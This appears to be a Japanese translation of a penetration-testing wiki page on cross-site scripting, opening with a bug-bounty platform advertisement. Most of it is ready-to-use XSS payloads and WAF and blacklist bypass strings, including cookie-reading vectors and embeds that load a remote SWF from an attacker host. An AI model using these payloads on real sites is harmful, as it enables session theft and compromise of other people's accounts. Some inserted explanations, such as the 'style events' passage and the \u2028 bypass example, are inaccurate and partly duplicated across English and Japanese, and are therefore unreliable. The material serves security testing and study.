# XSS（クロスサイトスクリプティング）

/<img src="../../.gitbook/assets/i3.png" alt="" data-size="original">

**バグバウンティのヒント**：ハッカーによって作成されたプレミアムな**バグバウンティプラットフォームであるIntigriti**に**サインアップ**してください！今すぐ[**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks)に参加し、最大**$100,000**の報奨金を獲得しましょう！

{% embed url="https://go.intigriti.com/hacktricks" %}

## 方法論

1. コントロールできる**任意の値**（_パラメータ_、_パス_、_ヘッダー_？、_クッキー_？）がHTMLに**反映**されているか、**JS**コードで使用されているかを確認します。
2. 反映/使用されている**コンテキスト**を見つけます。
3. 反映されている場合
1. 使用できる**シンボル**を確認し、それに応じてペイロードを準備します：
1. **生のHTML**で：
1. 新しいHTMLタグを作成できますか？
2. `javascript:`プロトコルをサポートするイベントや属性を使用できますか？
3. 保護をバイパスできますか？
4. HTMLコンテンツがクライアントサイドのJSエンジン（_AngularJS_、_VueJS_、_Mavo_など）によって解釈されている場合、[**クライアントサイドテンプレートインジェクション**](../client-side-template-injection-csti.md)を悪用できる場合があります。
5. JSコードを実行するHTMLタグを作成できない場合、[**Dangling Markup - HTML scriptless injection**](../dangling-markup-html-scriptless-injection.md)を悪用できる場合があります。
2. **HTMLタグ**の内部で：
1. 生のHTMLコンテキストに戻ることはできますか？
2. JSコードを実行するために新しいイベント/属性を作成できますか？
3. トラップされている属性はJSの実行をサポートしていますか？
4. 保護をバイパスできますか？
3. **JavaScriptコード**の内部で：
1. `<script>`タグをエスケープできますか？
2. 文字列をエスケープして異なるJSコードを実行できますか？
3. 入力がテンプレートリテラル\`\`にある場合は？
4. 保護をバイパスできますか？
4. 実行されているJavaScriptの**関数**
1. 実行する関数の名前を指定できます。例：`?callback=alert(1)`
4. **使用されている**場合：
1. **DOM XSS**を悪用できます。入力がどのように制御されているか、制御された入力がどのシンクによって使用されているかに注意してください。

複雑なXSSを解析する際には、次の情報を知っておくと便利です：

{% content-ref url="debugging-client-side-js.md" %}
[debugging-client-side-js.md](debugging-client-side-js.md)
{% endcontent-ref %}

## 反映された値

XSSを成功させるためには、まず最初に、ウェブページで**自分が制御できる値が反映**されているかを見つける必要があります。

* **中間的に反映された**：パラメータの値やパスの値がウェブページに反映されている場合、**反映型XSS**を悪用できる可能性があります。
* **保存されて反映された**：自分が制御する値がサーバーに保存され、ページにアクセスするたびに反映されている場合、**保存型XSS**を悪用できる可能性があります。
* **JSを介してアクセス**される：自分が制御する値がJSを使用してアクセスされている場合、**DOM XSS**を悪用できる可能性があります。

## コンテキスト

XSSを悪用しようとする場合、まず**入力がどこに反映されているか**を知る必要があります。コンテキストによって、さまざまな方法で任意のJSコードを実行できます。

### 生のHTML

入力が**生のHTML**ページに反映されている場合、JSコードを実行するためにいくつかの**HTMLタグ**を悪用する必要があります：`<img , <iframe , <svg , <script` ...これらは使用可能な多くのHTMLタグの一部です。\
また、[クライアントサイドテンプレートインジェクション](../client-side-template-injection-csti.md)に注意してください。

### HTMLタグの属性内部

入力がタグの属性の値の中に反映されている場合、次の方法を試すことができます：

1. 属性とタグの両方から**エスケープ**する（その後、生のHTMLになります）し、悪用するために新しいHTMLタグを作成します：`"><img [...]`
2. 属性からは**エスケープできるが、タグからはエスケープできない**場合（`>`がエンコードされるか削除される）、タグによってはJSコードを実行する**イベントを作成**できます：`" autofocus onfocus=alert(1) x="`
3. 属性から**エスケープできない**場合（`"`がエンコードされるか削除される）、値が反映されている**属性によって**、値をすべて制御するか一部のみ制御するかによって、悪用できるかどうかが異なります。たとえば、`onclick=`のようなイベントを制御できる場合、クリックされたときに任意のコードを実行できます。もう1つの興味深い**例**は、`href`属性で、`javascript:`プロトコルを使用して任意のコードを実行できます：**`href="javascript:alert(1)"`**
4. 入力が「**悪用できないタグ**」に反映されている場合、**`accesskey`**トリックを使用して脆弱性を悪用できます（これを悪用するには、ある種のソーシャルエンジニアが必要です）：**`" accesskey="x" onclick="alert(1)" x="`**

### JavaScriptコードの内部

この場合、入力はHTMLページの**`<script> [...] </script>`**タグ、`.js`ファイルの内部、または**`javascript:`**プロトコルを使用した属性の内部に反映されます。

* **`<script> [...] </script>`**タグの間に反映される場合、入力が引用符のいずれかの内部にある場合でも、`</script>`を注入してこのコンテキストから脱出することができます。これは、**ブラウザがまずHTMLタグを解析**し、その後コンテンツを解析するため、注入された`</script>`タグがHTMLコードの内部にあることに気づかないためです。
* JSの文字列の内部に反映されている場合で、前のトリックが機能しない場合は、文字列から**脱出**し、コードを**実行**し、JSコードを**再構築**する必要があります（エラーがある場合は実行されません）：
* `'-alert(1)-'`
* `';-alert(1)//`
* `\';alert(1)//`
* テンプレートリテラルの内部に反映されている場合、`${ ... }`構文を使用してJS式を**埋め込む**ことができます：`` var greetings = `Hello, ${alert(1)}` ``
* **Unicodeエンコード**を使用して**有効なjavascriptコード**を書くことができます：
```javascript
\u{61}lert(1)
\u0061lert(1)
\u{0061}lert(1)
```
#### Javascriptのホイスティング

Javascriptのホイスティングは、**使用された後に関数、変数、またはクラスを宣言する**機会を指します。

したがって、**未宣言のオブジェクトの後にJSコードをインジェクト**できるシナリオがある場合、それを宣言することで（エラーをスローする代わりに）構文を**修正**できます。
```javascript
// The function vulnerableFunction is not defined
vulnerableFunction('test', '<INJECTION>');
// You can define it in your injection to execute JS
//Payload1: param='-alert(1)-'')%3b+function+vulnerableFunction(a,b){return+1}%3b
'-alert(1)-''); function vulnerableFunction(a,b){return 1};

//Payload2: param=test')%3bfunction+vulnerableFunction(a,b){return+1}%3balert(1)
test'); function vulnerableFunction(a,b){ return 1 };alert(1)
```

```javascript
// If a variable is not defined, you could define it in the injection
// In the following example var a is not defined
function myFunction(a,b){
return 1
};
myFunction(a, '<INJECTION>')

//Payload: param=test')%3b+var+a+%3d+1%3b+alert(1)%3b
test'); var a = 1; alert(1);
```

```javascript
// If an undeclared class is used, you cannot declare it AFTER being used
var variable = new unexploitableClass();
<INJECTION>
// But you can actually declare it as a function, being able to fix the syntax with something like:
function unexploitableClass() {
return 1;
}
alert(1);
```

```javascript
// Properties are not hoisted
// So the following examples where the 'cookie' attribute doesn´t exist
// cannot be fixed if you can only inject after that code:
test.cookie('leo','INJECTION')
test['cookie','injection']
```
詳細については、Javascriptのホイスティングについては次を参照してください：[https://jlajara.gitlab.io/Javascript\_Hoisting\_in\_XSS\_Scenarios](https://jlajara.gitlab.io/Javascript\_Hoisting\_in\_XSS\_Scenarios)

### Javascript関数

いくつかのウェブページは、**実行する関数の名前をパラメータとして受け入れる**エンドポイントを持っています。実際によく見かける例は、`?callback=callbackFunc`のようなものです。

ユーザーから直接与えられたものが実行されようとしているかどうかを確認するためには、パラメータの値を変更して（例えば 'Vulnerable' に変更して）、コンソールで次のようなエラーを探します：

![](<../../.gitbook/assets/image (651) (2).png>)

脆弱な場合、値を送信するだけで**アラートをトリガー**することができる可能性があります：**`?callback=alert(1)`**。ただし、これらのエンドポイントでは、文字、数字、ドット、アンダースコアのみを許可するようにコンテンツを**検証する**ことが非常に一般的です（**`[\w\._]`**）。

ただし、その制限があっても、いくつかのアクションを実行することは可能です。これは、有効な文字を使用してDOM内の任意の要素に**アクセス**できるためです：

![](<../../.gitbook/assets/image (662).png>)

これに役立ついくつかの関数：
```
firstElementChild
lastElementChild
nextElementSibiling
lastElementSibiling
parentElement
```
あなたは直接**Javascriptの関数をトリガー**することも試すことができます：`obj.sales.delOrders`。

ただし、通常、指定された関数を実行するエンドポイントは、DOMがあまり興味深くないエンドポイントです。**同じオリジン内の他のページ**には、より興味深いDOMがあり、より多くのアクションを実行できます。

したがって、**異なるDOMでこの脆弱性を悪用**するために、**Same Origin Method Execution (SOME)** の攻撃手法が開発されました：

{% content-ref url="some-same-origin-method-execution.md" %}
[some-same-origin-method-execution.md](some-same-origin-method-execution.md)
{% endcontent-ref %}

### DOM

**JSコード**が、`location.href`のような**攻撃者によって制御されるデータ**を**安全に使用していない**場合があります。攻撃者はこれを悪用して任意のJSコードを実行することができます。

{% content-ref url="dom-xss.md" %}
[dom-xss.md](dom-xss.md)
{% endcontent-ref %}

### **Universal XSS**

この種のXSSは**どこにでも**見つけることができます。これらは単にWebアプリケーションのクライアントの脆弱性に依存するのではなく、**どんな****コンテキスト**にも依存します。この種の**任意のJavaScript実行**は、RCEを取得したり、クライアントやサーバーで**任意の****ファイル**を**読み取る**ことさえできます。\
いくつかの**例**：

{% content-ref url="server-side-xss-dynamic-pdf.md" %}
[server-side-xss-dynamic-pdf.md](server-side-xss-dynamic-pdf.md)
{% endcontent-ref %}

{% content-ref url="../../network-services-pentesting/pentesting-web/xss-to-rce-electron-desktop-apps/" %}
[xss-to-rce-electron-desktop-apps](../../network-services-pentesting/pentesting-web/xss-to-rce-electron-desktop-apps/)
{% endcontent-ref %}

## WAFバイパスエンコーディング画像

![from https://twitter.com/hackerscrolls/status/1273254212546281473?s=21](../../.gitbook/assets/eaubb2ex0aerank.jpg)

## 生のHTML内に注入する

入力がHTMLページ内に**反映**される場合、またはこのコンテキストでHTMLコードをエスケープして注入できる場合、**最初に** `<` を悪用して新しいタグを作成できるかどうかを確認する必要があります。単にその**文字**を**反映**させ、それが**HTMLエンコード**されるか、**削除**されるか、または**変更なしで反映**されるかを確認してください。**最後の場合にのみ、このケースを悪用することができます**。\
この場合、およびブラックリスト/ホワイトリストが使用されていない場合、次のようなペイロードを使用できます：
```javascript
<script>alert(1)</script>
<img src=x onerror=alert(1) />
<svg onload=alert('XSS')>
```
しかし、タグ/属性のブラックリスト/ホワイトリストが使用されている場合、作成できる**どのタグをブルートフォースするか**を特定する必要があります。\
許可されているタグが**どれかを特定**したら、見つかった有効なタグ内の属性/イベントをブルートフォースして、どのようにコンテキストを攻撃できるかを確認する必要があります。

### タグ/イベントのブルートフォース

[**https://portswigger.net/web-security/cross-site-scripting/cheat-sheet**](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)にアクセスし、_**Copy tags to clipboard**_をクリックします。次に、Burp Intruderを使用してすべてのタグを送信し、WAFによって悪意のあるタグとして検出されなかったかどうかを確認します。使用できるタグがわかったら、有効なタグを使用してすべてのイベントを**ブルートフォース**します（同じウェブページで_Copy events to clipboard_をクリックし、前と同じ手順を実行します）。

### カスタムタグ

有効なHTMLタグが見つからない場合は、**カスタムタグを作成**して`onfocus`属性でJSコードを実行することができます。XSSリクエストでは、URLの末尾に`#`を付けてページが**そのオブジェクトにフォーカス**し、コードを**実行**するようにする必要があります。
```
/?search=<xss+id%3dx+onfocus%3dalert(document.cookie)+tabindex%3d1>#x
```
### ブラックリスト回避

もしブラックリストが使用されている場合、いくつかの愚かなトリックを使って回避することができます。
```javascript
//Random capitalization
<script> --> <ScrIpT>
<img --> <ImG

//Double tag, in case just the first match is removed
<script><script>
<scr<script>ipt>
<SCRscriptIPT>alert(1)</SCRscriptIPT>

//You can substitude the space to separate attributes for:
/
/*%00/
/%00*/
%2F
%0D
%0C
%0A
%09

//Unexpected parent tags
<svg><x><script>alert('1'&#41</x>

//Unexpected weird attributes
<script x>
<script a="1234">
<script ~~~>
<script/random>alert(1)</script>
<script      ///Note the newline
>alert(1)</script>
<scr\x00ipt>alert(1)</scr\x00ipt>

//Not closing tag, ending with " <" or " //"
<iframe SRC="javascript:alert('XSS');" <
<iframe SRC="javascript:alert('XSS');" //

//Extra open
<<script>alert("XSS");//<</script>

//Just weird an unexpected, use your imagination
<</script/script><script>
<input type=image src onerror="prompt(1)">

//Using `` instead of parenthesis
onerror=alert`1`

//Use more than one
<<TexTArEa/*%00//%00*/a="not"/*%00///AutOFocUs////onFoCUS=alert`1` //
```
### 長さバイパス（小さなXSS）

{% hint style="info" %}
**さまざまな環境向けのさらなる小さなXSS** ペイロードは[**こちら**](https://github.com/terjanq/Tiny-XSS-Payloads)と[**こちら**](https://tinyxss.terjanq.me)で見つけることができます。
{% endhint %}
```html
<!-- Taken from the blog of Jorge Lajara -->
<svg/onload=alert``>
<script src=//aa.es>
<script src=//℡㏛.pw>
```
最後の方法は、5つに展開される2つのUnicode文字を使用する方法です：telsr\
これらの文字の詳細は[こちら](https://www.unicode.org/charts/normalization/)で確認できます。\
文字が分解されるかどうかを確認するには、[こちら](https://www.compart.com/en/unicode/U+2121)をチェックしてください。

### XSSクリック - クリックジャッキング

脆弱性を悪用するために、**ユーザーがリンクやフォームをクリックする必要がある**場合、[**クリックジャッキング**](../clickjacking.md#xss-clickjacking)を悪用してみることができます（ページが脆弱な場合）。

### 不可能 - ダングリングマークアップ

**HTMLタグにJSコードを実行する属性を作成することは不可能**だと思っている場合は、[**ダングリングマークアップ**](../dangling-markup-html-scriptless-injection.md)をチェックしてみてください。なぜなら、JSコードを実行せずに脆弱性を**悪用**することができるからです。

## HTMLタグ内への挿入

### タグ内/属性値からのエスケープ

もし**HTMLタグ内にいる**場合、まずはタグから**エスケープ**して、[前のセクション](./#injecting-inside-raw-html)で言及されているいくつかのテクニックを試してJSコードを実行してみることができます。\
もしタグから**エスケープできない**場合は、タグ内に新しい属性を作成してJSコードを実行しようとすることができます。例えば、次のようなペイロードを使用することができます（この例ではダブルクォートを使用して属性からエスケープしていますが、入力が直接タグ内に反映される場合は不要です）：
```bash
" autofocus onfocus=alert(document.domain) x="
" onfocus=alert(1) id=x tabindex=0 style=display:block>#x #Access http://site.com/?#x t
```
**スタイルイベント**

スタイルイベントは、HTML要素のスタイルを変更するために使用されるイベントです。これらのイベントは、ユーザーの入力や特定のアクションに応じてトリガーされます。スタイルイベントは、XSS攻撃に悪用される可能性があります。

以下に一般的なスタイルイベントの例を示します。

- `onmouseover`: マウスが要素の上に移動したときに発生します。
- `onmouseout`: マウスが要素から離れたときに発生します。
- `onfocus`: 要素がフォーカスを受け取ったときに発生します。
- `onblur`: 要素がフォーカスを失ったときに発生します。

攻撃者は、スタイルイベントを使用して、悪意のあるスクリプトを実行することができます。これにより、ユーザーのセッション情報の盗難や不正な操作が可能になります。

以下に、スタイルイベントを悪用したXSS攻撃の例を示します。

```html
<input type="text" onmouseover="alert('XSS Attack!')">
```

この例では、マウスがテキスト入力フィールドの上に移動すると、`alert('XSS Attack!')`というJavaScriptコードが実行されます。攻撃者は、このようなスタイルイベントを使用して、ユーザーに対して悪意のある操作を行うことができます。

スタイルイベントを悪用したXSS攻撃から保護するためには、入力データの検証とエスケープが重要です。信頼できるデータのみを使用し、ユーザーからの入力を適切に処理することが必要です。また、セキュリティ対策として、Content Security Policy（CSP）を実装することも推奨されます。
```python
<p style="animation: x;" onanimationstart="alert()">XSS</p>
<p style="animation: x;" onanimationend="alert()">XSS</p>

#ayload that injects an invisible overlay that will trigger a payload if anywhere on the page is clicked:
<div style="position:fixed;top:0;right:0;bottom:0;left:0;background: rgba(0, 0, 0, 0.5);z-index: 5000;" onclick="alert(1)"></div>
#moving your mouse anywhere over the page (0-click-ish):
<div style="position:fixed;top:0;right:0;bottom:0;left:0;background: rgba(0, 0, 0, 0.0);z-index: 5000;" onmouseover="alert(1)"></div>
```
### 属性内部で

属性からの脱出ができない場合でも（`"`がエンコードまたは削除されている場合）、**どの属性**に値が反映されるかによって、値を完全に制御するか一部のみ制御するかによって、それを悪用することができます。**例えば**、`onclick=`のようなイベントを制御できる場合、クリックされたときに任意のコードを実行することができます。\
もう1つの興味深い**例**は、`href`属性です。ここでは、`javascript:`プロトコルを使用して任意のコードを実行できます：**`href="javascript:alert(1)"`**

**HTMLエンコーディング/URLエンコードを使用したイベント内のバイパス**

HTMLタグの属性の値内部の**HTMLエンコードされた文字**は、実行時に**デコード**されます。したがって、次のようなものは有効になります（ペイロードは太字で示されています）：`<a id="author" href="http://none" onclick="var tracker='http://foo?`**`&apos;-alert(1)-&apos;`**`';">Go Back </a>`

**どの種類のHTMLエンコードでも有効**であることに注意してください：
```javascript
//HTML entities
&apos;-alert(1)-&apos;
//HTML hex without zeros
&#x27-alert(1)-&#x27
//HTML hex with zeros
&#x00027-alert(1)-&#x00027
//HTML dec without zeros
&#39-alert(1)-&#39
//HTML dec with zeros
&#00039-alert(1)-&#00039

<a href="javascript:var a='&apos;-alert(1)-&apos;'">a</a>
<a href="&#106;avascript:alert(2)">a</a>
<a href="jav&#x61script:alert(3)">a</a>
```
**URLエンコードも機能します。**
```python
<a href="https://example.com/lol%22onmouseover=%22prompt(1);%20img.png">Click</a>
```
**Unicodeエンコードを使用して内部イベントをバイパスする方法**

Sometimes, web applications implement security measures to prevent the execution of certain events, such as the `onclick` event. However, it is possible to bypass these security measures using Unicode encoding.

In Unicode encoding, characters are represented by their corresponding Unicode code points. By using certain Unicode characters, we can trick the web application into allowing the execution of the desired event.

To bypass the security measure, we can use the Unicode character `\u2028`, which represents the line separator. This character is not recognized as a special character by most web applications, allowing us to execute the desired event.

Here is an example of how to bypass the security measure using Unicode encoding:

```html
<input type="text" value="&#x2028;" onclick="alert('XSS')">
```

In this example, the Unicode character `\u2028` is represented as `&#x2028;`. When the `onclick` event is triggered, the `alert('XSS')` function will be executed, resulting in an XSS vulnerability.

It is important to note that this technique may not work in all cases, as web applications may have additional security measures in place. Additionally, it is always recommended to responsibly disclose any vulnerabilities discovered during penetration testing.
```javascript
//For some reason you can use unicode to encode "alert" but not "(1)"
<img src onerror=\u0061\u006C\u0065\u0072\u0074(1) />
<img src onerror=\u{61}\u{6C}\u{65}\u{72}\u{74}(1) />
```
### 属性内の特殊プロトコル

いくつかの場所では、**`javascript:`**または**`data:`**のプロトコルを使用して、**任意のJSコードを実行**することができます。一部の場所ではユーザーの操作が必要ですが、一部では必要ありません。
```javascript
javascript:alert(1)
JavaSCript:alert(1)
javascript:%61%6c%65%72%74%28%31%29 //URL encode
javascript&colon;alert(1)
javascript&#x003A;alert(1)
javascript&#58;alert(1)
&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3aalert(1)
java        //Note the new line
script:alert(1)

data:text/html,<script>alert(1)</script>
DaTa:text/html,<script>alert(1)</script>
data:text/html;charset=iso-8859-7,%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%31%29%3c%2f%73%63%72%69%70%74%3e
data:text/html;charset=UTF-8,<script>alert(1)</script>
data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=
data:text/html;charset=thing;base64,PHNjcmlwdD5hbGVydCgndGVzdDMnKTwvc2NyaXB0Pg
data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==
```
**これらのプロトコルを注入できる場所**

**一般的に**、`javascript:`プロトコルは、属性`href`を受け入れる**任意のタグ**および属性`src`を受け入れる**ほとんどのタグ**（ただし`<img>`は除く）で使用できます。
```markup
<a href="javascript:alert(1)">
<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=">
<form action="javascript:alert(1)"><button>send</button></form>
<form id=x></form><button form="x" formaction="javascript:alert(1)">send</button>
<object data=javascript:alert(3)>
<iframe src=javascript:alert(2)>
<embed src=javascript:alert(1)>

<object data="data:text/html,<script>alert(5)</script>">
<embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik7PC9zY3JpcHQ+" type="image/svg+xml" AllowScriptAccess="always"></embed>
<embed src="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg=="></embed>
<iframe src="data:text/html,<script>alert(5)</script>"></iframe>

//Special cases
<object data="//hacker.site/xss.swf"> .//https://github.com/evilcos/xss.swf
<embed code="//hacker.site/xss.swf" allowscriptaccess=always> //https://github.com/evilcos/xss.swf
<iframe srcdoc="<svg onload=alert(4);>">
```
**他の難読化トリック**

_**この場合、前のセクションで説明したHTMLエンコーディングとUnicodeエンコーディングのトリックも有効です。なぜなら、あなたは属性内にいるからです。**_
```javascript
<a href="javascript:var a='&apos;-alert(1)-&apos;'">
```
さらに、これらの場合には別の**便利なトリック**があります: **`javascript:...`内の入力がURLエンコードされている場合でも、実行される前にURLデコードされます。**ですので、**シングルクォート**を使用して**文字列**から**エスケープ**する必要があり、**URLエンコードされている**ことがわかった場合でも、**問題ありません**。実行時には**シングルクォート**として**解釈**されます。
```javascript
&apos;-alert(1)-&apos;
%27-alert(1)-%27
<iframe src=javascript:%61%6c%65%72%74%28%31%29></iframe>
```
注意してください。`URLエンコード + HTMLエンコード`を任意の順序で使用して**ペイロード**をエンコードしようとすると、**機能しません**が、**ペイロード内でそれらを混在させることができます**。

**`javascript:`を使用した16進数と8進数のエンコード**

少なくとも`iframe`の`src`属性内で、**HTMLタグを実行するために16進数と8進数のエンコード**を使用することができます。
```javascript
//Encoded: <svg onload=alert(1)>
// This WORKS
<iframe src=javascript:'\x3c\x73\x76\x67\x20\x6f\x6e\x6c\x6f\x61\x64\x3d\x61\x6c\x65\x72\x74\x28\x31\x29\x3e' />
<iframe src=javascript:'\74\163\166\147\40\157\156\154\157\141\144\75\141\154\145\162\164\50\61\51\76' />

//Encoded: alert(1)
// This doesn't work
<svg onload=javascript:'\x61\x6c\x65\x72\x74\x28\x31\x29' />
<svg onload=javascript:'\141\154\145\162\164\50\61\51' />
```
### リバースタブナビング

Reverse tab nabbing（リバースタブナビング）は、ウェブアプリケーションの脆弱性であり、攻撃者が悪意のあるウェブサイトを作成し、被害者がそのウェブサイトを開いた際に、被害者のブラウザのタブを別のウェブサイトにリダイレクトする攻撃手法です。

この攻撃手法は、被害者が信頼しているウェブサイトを開いている間に実行されます。攻撃者は、悪意のあるウェブサイトにリンクを設置し、被害者がそのリンクをクリックすると、被害者のブラウザのタブが攻撃者が指定した別のウェブサイトに切り替わります。

この攻撃手法は、被害者のセッション情報や個人情報を盗むために使用されることがあります。被害者が悪意のあるウェブサイトにログインしてしまうと、攻撃者はその情報を収集し、不正な目的で悪用することができます。

この攻撃手法を防ぐためには、ウェブアプリケーションの開発者が適切なセキュリティ対策を実施する必要があります。例えば、外部のウェブサイトへのリダイレクトを行う際には、信頼できるドメインのみを許可するなどの対策が有効です。

また、ユーザー側でも注意が必要です。不審なリンクをクリックする前に、リンクのURLを確認し、信頼できるソースからのものであるかを確認することが重要です。
```javascript
<a target="_blank" rel="opener"
```
任意の **`<a href=`** タグにURLを注入できる場合、**`target="_blank"`** と **`rel="opener"`** 属性を含むタグをチェックして、**次のページでこの動作を悪用** できます：

{% content-ref url="../reverse-tab-nabbing.md" %}
[reverse-tab-nabbing.md](../reverse-tab-nabbing.md)
{% endcontent-ref %}

### イベントハンドラーバイパス

まず、有用な **"on" イベントハンドラー** については、このページ ([https://portswigger.net/web-security/cross-site-scripting/cheat-sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)) をチェックしてください。\
もし、ブラックリストによってこのイベントハンドラーの作成が制限されている場合、以下のバイパスを試すことができます：
```javascript
<svg onload%09=alert(1)> //No safari
<svg %09onload=alert(1)>
<svg %09onload%20=alert(1)>
<svg onload%09%20%28%2c%3b=alert(1)>

//chars allowed between the onevent and the "="
IExplorer: %09 %0B %0C %020 %3B
Chrome: %09 %20 %28 %2C %3B
Safari: %2C %3B
Firefox: %09 %20 %28 %2C %3B
Opera: %09 %20 %2C %3B
Android: %09 %20 %28 %2C %3B
```
### "Unexploitable tags"（input hidden、link、canonical）におけるXSS

[ここ](https://portswigger.net/research/xss-in-hidden-input-fields)から：\
**隠し属性内でXSSペイロードを実行**することができますが、**被害者**を**説得**して**キーの組み合わせ**を押させる必要があります。Firefox Windows/Linuxでは、キーの組み合わせは**ALT+SHIFT+X**で、OS Xでは**CTRL+ALT+X**です。アクセスキー属性で異なるキーを使用して異なるキーの組み合わせを指定することもできます。以下はベクトルです：
```markup
<input type="hidden" accesskey="X" onclick="alert(1)">
```
**XSSペイロードは次のようになります：`" accesskey="x" onclick="alert(1)" x="`**

### ブラックリストバイパス

このセクションでは、さまざまなエンコーディングを使用したトリックがすでに公開されています。次の場所で使用できるかを学ぶために**戻ってください：**

* **HTMLエンコーディング（HTMLタグ）**
* **Unicodeエンコーディング（有効なJSコードになる場合）：** `\u0061lert(1)`
* **URLエンコーディング**
* **16進数および8進数エンコーディング**
* **データエンコーディング**

**HTMLタグと属性のバイパス**

[前のセクションのブラックリストバイパス](./#blacklist-bypasses)を読んでください。

**JavaScriptコードのバイパス**

[次のセクションのJavaScriptバイパスブラックリストテクニック](./#javascript-bypass-blacklists-techniques)を読んでください。

### CSS-Gadgets

非常に小さな部分のウェブでXSSを見つけた場合（たとえば、フッターの小さなリンクにonmouseover要素が必要な場合）、要素が占めるスペースを変更してリンクが発火する可能性を最大化することができます。

たとえば、次のように要素にスタイリングを追加できます：`position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: red; opacity: 0.5`

ただし、WAFがスタイル属性をフィルタリングしている場合は、CSS Styling Gadgetsを使用できます。たとえば、次のようなものを見つけた場合

> .test {display:block; color: blue; width: 100%\}

および

> \#someid {top: 0; font-family: Tahoma;}

今、リンクを修正して次の形式にすることができます

> \<a href=”” id=someid class=test onclick=alert() a=””>

このトリックは[https://medium.com/@skavans\_/improving-the-impact-of-a-mouse-related-xss-with-styling-and-css-gadgets-b1e5dec2f703](https://medium.com/@skavans\_/improving-the-impact-of-a-mouse-related-xss-with-styling-and-css-gadgets-b1e5dec2f703)から取得されました。

## JavaScriptコード内への注入

この場合、**入力**は`.js`ファイルのJSコード内、または`<script>...</script>`タグの間、またはJSコードを実行できるHTMLイベントの間、または`javascript:`プロトコルを受け入れる属性の間に**反映**されます。

### \<script>タグのエスケープ

コードが`<script> [...] var input = '反映されたデータ' [...] </script>`内に挿入されている場合、簡単に\<script>タグを**エスケープ**することができます：
```javascript
</script><img src=1 onerror=alert(document.domain)>
```
注意してください、この例では**シングルクォートを閉じていません**が、それは必要ありません。なぜなら、**ブラウザはまずHTMLパースを実行**してスクリプトのブロックを含むページ要素を識別し、その後にJavaScriptパースを実行して埋め込まれたスクリプトを理解して実行するからです。

### JSコード内部

もし`<>`がサニタイズされている場合でも、入力が**配置されている場所**で文字列を**エスケープ**し、任意のJSを**実行**することができます。JSの構文を**修正する**ことが重要です。なぜなら、エラーがある場合、JSコードは実行されないからです。
```
'-alert(document.domain)-'
';alert(document.domain)//
\';alert(document.domain)//
```
### テンプレートリテラル \`\`

JSでは、シングルクォートやダブルクォート以外にも、**バックティック** **` `` `** を使用して**文字列**を構築することができます。これは、`${ ... }` 構文を使用して**埋め込まれたJS式**を実行することができるため、テンプレートリテラルとして知られています。\
したがって、もし入力がバックティックを使用しているJS文字列内に**反映**されている場合、`${ ... }` 構文を悪用して**任意のJSコード**を実行することができます。

これは以下のように悪用されることがあります:
```javascript
`${alert(1)}`
`${`${`${`${alert(1)}`}`}`}`
```

```````````````javascript
// This is valid JS code, because each time the function returns itself it's recalled with ``
function loop(){return loop}
loop``````````````
```````````````
### エンコードされたコードの実行

In some cases, web applications may apply encoding or filtering techniques to prevent the execution of malicious code. However, it is still possible to bypass these protections and execute encoded code.

いくつかの場合、ウェブアプリケーションは、悪意のあるコードの実行を防ぐためにエンコードやフィルタリングの技術を適用することがあります。しかし、これらの保護を回避し、エンコードされたコードを実行することはまだ可能です。

One common technique is to use JavaScript's `eval()` function to execute encoded code. By encoding the malicious payload and then using `eval()` to decode and execute it, an attacker can bypass filters and execute arbitrary code.

一般的なテクニックの1つは、JavaScriptの`eval()`関数を使用してエンコードされたコードを実行することです。悪意のあるペイロードをエンコードし、それをデコードして実行するために`eval()`を使用することで、攻撃者はフィルタを回避し、任意のコードを実行することができます。

Here is an example of how this technique can be used:

以下は、このテクニックがどのように使用されるかの例です：

```javascript
var encodedPayload = "eval(String.fromCharCode(97,108,101,114,116,40,49,41))";
eval(encodedPayload);
```

In this example, the payload is encoded using the `String.fromCharCode()` function, which takes a series of character codes and returns the corresponding string. The `eval()` function then executes the decoded payload, which in this case is the string "alert(1)".

この例では、ペイロードは`String.fromCharCode()`関数を使用してエンコードされており、この関数は文字コードのシリーズを受け取り、対応する文字列を返します。`eval()`関数は、デコードされたペイロードを実行します。この場合、デコードされたペイロードは文字列"alert(1)"です。

By using this technique, an attacker can execute arbitrary JavaScript code, potentially leading to various security vulnerabilities such as cross-site scripting (XSS) attacks.

このテクニックを使用することで、攻撃者は任意のJavaScriptコードを実行することができ、クロスサイトスクリプティング（XSS）攻撃などのさまざまなセキュリティの脆弱性を引き起こす可能性があります。
```markup
<script>\u0061lert(1)</script>
<svg><script>alert&lpar;'1'&rpar;
<svg><script>&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;</script></svg>  <!-- The svg tags are neccesary
